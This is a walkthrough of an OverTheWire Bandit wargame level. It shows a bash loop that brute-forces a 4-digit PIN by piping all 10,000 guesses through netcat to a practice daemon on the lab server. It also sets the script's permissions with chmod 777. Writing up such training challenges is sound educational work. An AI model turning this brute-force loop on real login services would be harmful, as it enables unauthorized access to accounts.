# Bandit Level 24 → Level 25

## Level Information
- **Level:** 24 → 25
- **Username:** bandit24
- **Host:** bandit.labs.overthewire.org
- **Port:** 2220

## Level Goal
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

## Solution Steps

### 1. Connect to Bandit24
```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```
### 2. Create a Working Directory
```bash
mkdir /tmp/mydir
cd /tmp/mydir
```
### 3. Create a Brute Force Script
```bash
vim brute.sh
```
Add the following content:
```bash
#!/bin/bash

bandit24=current_bandit24_password

for pin in {0000..9999}; do
    echo "$bandit24 $pin"
done | nc localhost 30002
```
### 4. Make Script Executable
```bash
chmod 777 brute.sh
```
### 5. Execute the Brute Force Script
```bash
./brute.sh
```
Output: Script tries all combinations and eventually returns the password for bandit25
### Commands Used
- mkdir /tmp/mydir - Create working directory

- cd /tmp/mydir - Navigate to working directory

- vim brute.sh - Create brute force script

- chmod 777 brute.sh - Make script executable

- ./brute.sh - Execute brute force attack

## Important Concepts
### Brute Force Attack
- Systematically tries all possible combinations (0000-9999)

- Uses bash brace expansion {0000..9999} to generate numbers

- Pipes output directly to netcat connection

### Network Service Interaction
- Daemon listens on port 30002

- Requires format: "bandit24_password pincode"

- Returns bandit25 password on correct combination

### Script Efficiency
- Single connection for all attempts

- No need to create new connections for each try

- Automated process saves time and effort


